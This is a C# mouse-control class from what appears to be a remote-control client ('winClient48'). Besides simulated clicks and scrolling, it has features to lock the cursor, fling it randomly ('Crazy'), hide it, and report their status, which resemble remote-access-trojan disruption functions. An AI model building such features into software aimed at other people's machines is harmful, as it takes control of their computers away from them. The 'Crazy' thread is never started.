using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    public class clsfnMouse
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);

        [DllImport("user32.dll")]
        private static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);

        private bool lock_mouse = false;
        private bool crazy_mouse = false;
        private bool hide_mouse = false;

        private Point original_ptr;

        private const uint INPUT_MOUSE = 0;

        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        private const uint MOUSEEVENTF_WHEEL = 0x0800;

        // Input structure
        [StructLayout(LayoutKind.Sequential)]
        private struct INPUT
        {
            public uint type;
            public MOUSEINPUT mi;
        }

        // Mouse input structure
        [StructLayout(LayoutKind.Sequential)]
        private struct MOUSEINPUT
        {
            public int dx;
            public int dy;
            public uint mouseData;
            public uint dwFlags;
            public uint time;
            public IntPtr dwExtraInfo;
        }


        public string Status()
        {
            return $"{(lock_mouse ? "1" : "0")}|{(crazy_mouse ? "1" : "0")}";
        }
        public Point GetPosition()
        {
            return Cursor.Position;
        }
        public void SetPosition(int x, int y)
        {
            Cursor.Position = new Point(x, y);
        }
        public void SetPosition(Point ptn)
        {
            SetPosition(ptn.X, ptn.Y);
        }
        public void MouseLD()
        {
            Point ptr = GetPosition();
            mouse_event(MOUSEEVENTF_LEFTDOWN, (uint)ptr.X, (uint)ptr.Y, 0, 0);
        }

        // Simulate mouse left button up
        public void MouseLU()
        {
            Point ptr = GetPosition();
            mouse_event(MOUSEEVENTF_LEFTUP, (uint)ptr.X, (uint)ptr.Y, 0, 0);
        }

        // Simulate mouse right button down
        public void MouseRD()
        {
            Point ptr = GetPosition();
            mouse_event(MOUSEEVENTF_RIGHTDOWN, (uint)ptr.X, (uint)ptr.Y, 0, 0);
        }

        // Simulate mouse right button up
        public void MouseRU()
        {
            Point ptr = GetPosition();
            mouse_event(MOUSEEVENTF_RIGHTUP, (uint)ptr.X, (uint)ptr.Y, 0, 0);
        }

        //CLICK
        public void MouseClk()
        {
            Point ptr = GetPosition();
            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)ptr.X, (uint)ptr.Y, 0, 0);
        }

        // Simulate mouse scroll
        public void MouseSC(int amount)
        {
            Point ptr = GetPosition();
            mouse_event(MOUSEEVENTF_WHEEL, 0, 0, (uint)amount, 0);
        }
        public void Lock()
        {
            new Thread(() =>
            {
                Point ptn = GetPosition();
                lock_mouse = true;
                while (lock_mouse)
                {
                    SetPosition(ptn);
                    Thread.Sleep(10);
                }
            }).Start();
        }
        public void Unlock()
        {
            lock_mouse = false;
        }
        public void Crazy()
        {
            Rectangle rect = Screen.PrimaryScreen.Bounds;
            new Thread(() =>
            {
                crazy_mouse = true;
                while (crazy_mouse)
                {
                    Random rand = new Random();
                    Point ptn = new Point(rand.Next(rect.Width), rand.Next(rect.Height));
                    SetPosition(ptn);
                }
            });
        }
        public void Calm()
        {
            crazy_mouse = false;
        }
        public void ChangeCursorIcon(string b64_img)
        {

        }
        public void Show()
        {
            hide_mouse = false;
            Cursor.Show();
        }
        public void Hide()
        {
            hide_mouse = true;
            Cursor.Hide();
        }

        public void MouseLC()
        {
            // Create an array of INPUT structures
            INPUT[] inputs = new INPUT[2];

            // Mouse Down
            inputs[0].type = INPUT_MOUSE;
            inputs[0].mi = new MOUSEINPUT
            {
                dwFlags = MOUSEEVENTF_LEFTDOWN
            };

            // Mouse Up
            inputs[1].type = INPUT_MOUSE;
            inputs[1].mi = new MOUSEINPUT
            {
                dwFlags = MOUSEEVENTF_LEFTUP
            };

            // Send the input events
            SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(INPUT)));
        }
    }
}
